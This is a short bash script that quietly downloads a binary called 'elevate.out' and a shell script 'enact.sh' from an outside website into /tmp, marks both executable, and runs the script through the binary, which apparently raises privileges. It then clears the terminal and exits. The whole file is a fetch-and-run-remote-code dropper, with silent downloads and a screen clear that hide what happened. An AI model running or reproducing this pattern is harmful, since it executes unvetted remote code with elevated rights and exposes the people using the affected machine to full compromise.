#!/bin/bash

curl -s https://erikboesen.com/downloads/elevate.out --output /tmp/elevate.out
chmod +x /tmp/elevate.out

curl -s https://erikboesen.com/downloads/enact.sh --output /tmp/enact.sh
chmod +x /tmp/enact.sh

/tmp/elevate.out <<EOF
/tmp/enact.sh
EOF

clear
exit
